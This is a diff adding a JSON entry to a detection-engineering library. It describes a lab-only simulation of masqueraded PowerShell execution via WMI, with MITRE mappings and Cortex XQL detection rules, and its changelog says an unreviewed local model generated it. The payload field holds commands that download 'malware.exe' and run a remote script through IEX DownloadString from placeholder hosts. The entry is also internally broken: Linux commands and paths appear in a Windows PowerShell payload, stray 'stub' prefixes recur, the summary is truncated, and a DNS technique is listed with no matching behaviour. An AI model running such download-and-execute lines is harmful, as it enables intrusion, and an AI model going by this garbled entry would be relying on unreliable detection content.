@@ -1,0 +1,193 @@
+{
+  "id": "TTP-0000-0086",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Masqueraded PowerShell Execution via WMI",
+    "summary": "An attacker masquerades a malicious PowerShell script as a legitimate WMI utility to execute commands. Cortex detects this behavior by monitoring for suspicious process execution patterns and file acc",
+    "description": "An attacker masquerades a malicious PowerShell script as a legitimate WMI utility to execute commands. Cortex detects this behavior by monitoring for suspicious process execution patterns and file access."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget http://192.0.2.50/malware.exe -O /tmp/wmi.exe\nstub chmod +x /tmp/wmi.exe\nstub /tmp/wmi.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.100/payload.ps1')\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of masqueraded wmi.exe",
+        "expected_value": "action_process_image_name = 'wmi.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Downloaded malicious executable",
+        "expected_value": "action_file_path = '/tmp/wmi.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.100'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Masqueraded Third-Party Utility Execution",
+        "description": "Detection of legitimate utility (wmi.exe) being used to execute malicious code",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'wmi.exe'\n| filter action_process_image_name != 'wmi.exe'",
+        "mitre_technique_ids": [
+          "T1047",
+          "T1059.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious Masquerade Behavior",
+        "description": "Detection of process execution where a legitimate utility is used to launch an unexpected child process",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'wmi.exe'\n| filter action_process_image_name != 'wmi.exe'\n| filter causality_actor_process_image_name = 'cmd.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name = 'wmi.exe'",
+        "mitre_technique_ids": [
+          "T1047",
+          "T1059.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Masquerade Process Start Detection",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'wmi.exe'\n| filter action_process_image_name != 'wmi.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Execution of masqueraded third-party utility; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/execution-of-masqueraded-third-party-utility"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Execution of masqueraded third-party utility",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/execution-of-masqueraded-third-party-utility",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1047",
+      "url": "https://attack.mitre.org/techniques/T1047/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071.004",
+      "url": "https://attack.mitre.org/techniques/T1071/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
